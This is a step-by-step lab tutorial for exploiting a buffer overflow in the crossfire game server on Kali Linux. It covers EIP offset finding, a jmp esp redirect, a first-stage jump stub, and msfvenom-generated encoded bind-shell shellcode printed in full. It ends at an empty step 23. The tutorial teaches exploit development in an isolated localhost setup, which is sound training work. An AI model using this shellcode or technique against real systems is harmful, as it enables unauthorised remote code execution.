# Linux Buffer Overflow

## Setup

1. Setup your IPTABLE rules as below, this stops traffic from other hosts and only allows localhost traffic

   ```
   root@kali:~# iptables -A INPUT -p TCP --destination-port 13327 \! -d 127.0.0.1 -j DROP
   root@kali:~# iptables -A INPUT -p TCP --destination-port 4444 \! -d 127.0.0.1 -j DROP
   ```

2. Load the vunerable application (crossfire) using edb (Evans DB) `root@kali:~# edb --run /usr/games/crossfire/bin/crossfire` 

3. The application is loaded in a paused state, so hit the run button twice

4. We can then crash the programme using the buffer exploit `crossfire-poc1.py`, which will display an error message in EDB and you can see that the EIP register has been overflowed with `A` values

5. We now need to find which bytes are overflowing into the EIP, we can do this using the pattern tool in metasploit, which creates a required number of unique bytes (the number of `A` values the script is injecting

    ```
    root@kali:~/Desktop/lessons/linuxbuffer# updatedb
    root@kali:~/Desktop/lessons/linuxbuffer# locate pattern_create
    /usr/share/metasploit-framework/tools/pattern_create.rb
    root@kali:~/Desktop/lessons/linuxbuffer# /usr/share/metasploit-framework/tools/pattern_create.rb 4379
    ```

6. Update the script, see `crossfire-poc2.py` with the new exploit code and restart the application/debugger

7. When you run the script now, you will get the same overflow message but now with different bytes, we can use these bytes to locate the point at which EIP was overflowed

8. Get the ASCII value of the hex displayed in the error message `echo HEXHERE | xxd -r -p` or just use the metasploit pattern offset tool

    ```
    root@kali:~/Desktop/lessons/linuxbuffer# /usr/share/metasploit-framework/tools/pattern_offset.rb 46367046
    [*] Exact match at offset 4368
    ```

9. Rewrite your script to confirm this, see `crossfire-poc3.py`

10. Restart and rerun the debugger/app/script

11. You can now see our EIP is overflown with `x42` or `B` so we know we are in the right place

12. We then look at all the registers i.e `EAX, EBX, ECX` looking for one that points to a part of our overflow. We find that `ESP` is pointing to the end of our overflow with 9 bytes remaining

13. When testing we find that we can't increase beyond 9 bytes as the programme crashes in a completely different way, we will have to use a `first stage shellcode`

14. During testing we noted that the `EAX` register points to the start of our input including the `setup sound` part, this made it unsuitable for injecting the shell but we can manipulate the `EAX` register to skip over the first few bytes.

15. First we need to check for bad characters, these are characters that effect the programme behaviour adversily, we do this using `crossfire-poc4.py` and repeatadly sending the exploit and checking the memory for any characters that mangle the input or disappear.

16. We then craft an exploit using `NASM` to add 12 bytes to EAX then jump to it

    ```
    root@kali:~/Desktop/lessons/linuxbuffer# locate nasm_shell
    /usr/share/metasploit-framework/tools/nasm_shell.rb
    root@kali:~/Desktop/lessons/linuxbuffer# /usr/share/metasploit-framework/tools/nasm_shell.rb
    nasm > add eax,12
    00000000  83C00C            add eax,byte +0xc
    nasm > jmp eax
    00000000  FFE0              jmp eax
    ```

15. We copy the hex code (`83C00C` and `FFE0`) into our exploit, see `crossfire-poc5.py`

16. Using the EDB plugin "opcode searcher" we look for the code `jmp esp` and note down the address

17. We then replace the B's that were previously going to the EIP with the address of the `jmp esp` command, see `crossfire-poc6.py`. 

18. Restart edb and the application, but before starting place a breakpoint on the address with the `jmp esp` command. Once done start as normal and send payload

19. When the breakpoint is hit (confirm the correct address), we check the ESP register and can see that it is pointing to our first stage shell code

20. Press F8 to take the jump further confirming the above. Whilst watching where EAX is pointing we now run the commands step by step (press F8 again), we can see that EAX updates to the start of our `A` values. Pressing F8 once more redirects code execution to the start of our `A`s

21. Using `msfvenom` generate shellcode to replace our A values with

    ```
    root@kali:~/Desktop# msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c b "\x00\x20" --platform linux -a x86 -e x86/shikata_ga_nai
    Found 1 compatible encoders
    Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
    x86/shikata_ga_nai succeeded with size 105 (iteration=0)
    unsigned char buf[] = 
    "\xdb\xcc\xd9\x74\x24\xf4\xbd\xb0\x32\x2d\xb5\x5a\x29\xc9\xb1"
    "\x14\x83\xc2\x04\x31\x6a\x15\x03\x6a\x15\x52\xc7\x1c\x6e\x65"
    "\xcb\x0c\xd3\xda\x66\xb1\x5a\x3d\xc6\xd3\x91\x3d\x7c\x42\x78"
    "\x55\x81\x7a\x6d\xf9\xef\x6a\xdc\x51\x79\x6b\xb4\x37\x21\xa1"
    "\xc9\x3e\x90\x3d\x79\x44\xa3\x58\xb0\xc4\x80\x14\x2c\x09\x86"
    "\xc6\xe8\xfb\xb8\xb0\xc7\x7b\x8f\x39\x20\x13\x3f\x95\xa3\x8b"
    "\x57\xc6\x21\x22\xc6\x91\x45\xe4\x45\x2b\x68\xb4\x61\xe6\xeb";
    ```

22. Add this code to the start of our exploit, ensuring that you componsate for the number of bytes added (remove `A`'s from the string). As seen in `crossfire-poc7.py`

23. 


